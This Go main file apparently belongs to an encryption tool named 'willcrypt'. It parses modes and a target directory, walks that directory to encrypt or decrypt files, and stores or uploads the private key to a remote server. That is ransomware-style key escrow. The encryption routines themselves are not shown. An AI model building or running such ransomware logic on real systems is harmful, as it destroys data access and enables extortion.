package main

import (
	"log"
	"net"
	"path/filepath"
	"strconv"
	"sync"

	"fmt"
	"os"

	"github.com/spf13/pflag"
	"github.com/spf13/viper"
	"github.com/sywc670/willcrypt/internal/utils"
)

func configure() {
	configFile := pflag.StringP("config", "c", filepath.Join(getwd(), "config.yml"), "")
	pflag.String("location", "testground", "")
	pflag.BoolP("verbose", "v", false, "")
	pflag.StringP("mode", "m", "genlocal", "")
	pflag.StringP("single-path", "f", "", "must enable single")
	pflag.Bool("enable-single", false, "")
	pflag.BoolP("decode", "d", false, "")
	pflag.StringP("key-path", "k", filepath.Join(getwd(), "priv.key"), "")
	pflag.Int("server.port", 8080, "server port")
	pflag.String("server.host", "localhost", "server host")

	pflag.Parse()
	viper.BindPFlags(pflag.CommandLine)

	viper.SetConfigFile(*configFile)
	viper.SetConfigType("yaml")

	if err := viper.ReadInConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "Read config fail: %v", err)
	}

	viper.SetEnvPrefix("wcrypt")
	viper.AutomaticEnv()

	if err := viper.Unmarshal(&cfg); err != nil {
		log.Fatalf("Load config fail: %v", err)
	}

	check()
}

func check() {
	if cfg.EnableSingle && cfg.SinglePath == "" {
		fmt.Fprintf(os.Stderr, "Args conflict.\n")
		os.Exit(1)
	}

	if cfg.Mode == ModeGenLocal && cfg.Decode {
		fmt.Fprintf(os.Stderr, "Args conflict.\n")
		fmt.Printf("Change Mode to %s.\n", ModeLocal)
		cfg.Mode = ModeLocal
	}

	if cfg.Mode == ModeGenRemote && cfg.Decode {
		fmt.Fprintf(os.Stderr, "Args conflict.\n")
		os.Exit(1)
	}

	// check if remote server is running before encryption.
	if cfg.Mode == ModeGenRemote || cfg.Mode == ModeRemote {
		addr := cfg.Server.Host + ":" + strconv.Itoa(cfg.Server.Port)
		_, err := net.Dial("tcp", addr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Can't connect to remote server at %s.\n", addr)
			os.Exit(1)
		}
	}

	// check if location exists.
	_, err := os.Stat(cfg.Location)
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Fprintf(os.Stderr, "%s not exists.\n", cfg.Location)
			os.Exit(1)
		} else {
			panic(err)
		}
	}
}

func main() {
	configure()

	priv, err := getPrivKey()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Get priv key error: %v.\n", err)
		os.Exit(1)
	}

	if cfg.Verbose || cfg.Mode == ModeGenRemote {
		fmt.Println()
		fmt.Println("Priv key:")
		fmt.Println(utils.EncodeBase64(utils.Stringify(priv)))
		fmt.Println()
	}

	var wg sync.WaitGroup
	wg.Add(1)
	goWalkCryption(priv, &wg)
	wg.Wait()
	if !cfg.Decode {
		storeOrUpload(priv)
	}
	debug("Done...")
}

func getwd() string {
	s, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	return s
}
